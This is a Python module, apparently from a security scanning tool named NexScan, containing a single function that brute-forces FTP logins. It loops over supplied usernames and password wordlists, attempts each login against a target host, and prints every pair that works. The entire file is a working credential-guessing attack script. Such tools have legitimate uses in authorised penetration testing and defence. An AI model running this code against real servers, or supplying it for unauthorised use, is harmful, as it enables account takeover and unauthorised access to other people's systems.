#!/usr/bin/env python3
"""
This file is part of NexScan.

NexScan is free software: you can use it for personal and non-commercial purposes under the terms of the Custom License.

For commercial use, please contact Nexeo Security at business@nexeosecurity.tech.

NexScan is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the Custom License for more details, located in the LICENSE file.
"""

from ftplib import FTP

def bruteFTP(host, userfile, passfile, user=None, password=None, verbose=False, stop_on_success=False):
    print(f"\nAttacking ftp://{host}....\n")
    try:
        # Case where both user and password are provided directly
        if user and password:
            try:
                ftp = FTP(host)
                ftp.login(user, password)
                print(f'\033[92m [+]\033[0m {user} : {password}')
                ftp.quit()
            except Exception as e:
                if verbose:
                    print(f'\033[91m [-]\033[0m {user} : {password} (Error: {e})')

        # Case where password file and a single user is provided
        elif passfile and user:
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for password in passwords:
                password = password.strip()
                try:
                    ftp = FTP(host)
                    ftp.login(user, password)
                    print(f'\033[92m [+]\033[0m {user} : {password}')
                    ftp.quit()
                    if stop_on_success:
                        return
                except Exception as e:
                    if verbose:
                        print(f'\033[91m [-]\033[0m {user} : {password} (Error: {e})')

        # Case where user file and single password is provided
        elif userfile and password:
            with open(userfile, 'r') as f:
                users = f.readlines()
            for user in users:
                user = user.strip()
                try:
                    ftp = FTP(host)
                    ftp.login(user, password)
                    print(f'\033[92m [+]\033[0m {user} : {password}')
                    ftp.quit()
                    if stop_on_success:
                        return
                except Exception as e:
                    if verbose:
                        print(f'\033[91m [-]\033[0m {user} : {password} (Error: {e})')

        # Case where both user file and password file are provided
        elif userfile and passfile:
            with open(userfile, 'r') as f:
                users = f.readlines()
            with open(passfile, 'r') as f:
                passwords = f.readlines()
            for user in users:
                user = user.strip()
                for password in passwords:
                    password = password.strip()
                    try:
                        ftp = FTP(host)
                        ftp.login(user, password)
                        print(f'\033[92m [+]\033[0m {user} : {password}')
                        ftp.quit()
                        if stop_on_success:
                            return
                    except Exception as e:
                        if verbose:
                            print(f'\033[91m [-]\033[0m {user} : {password} (Error: {e})')

    except KeyboardInterrupt:
        print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
        exit(1)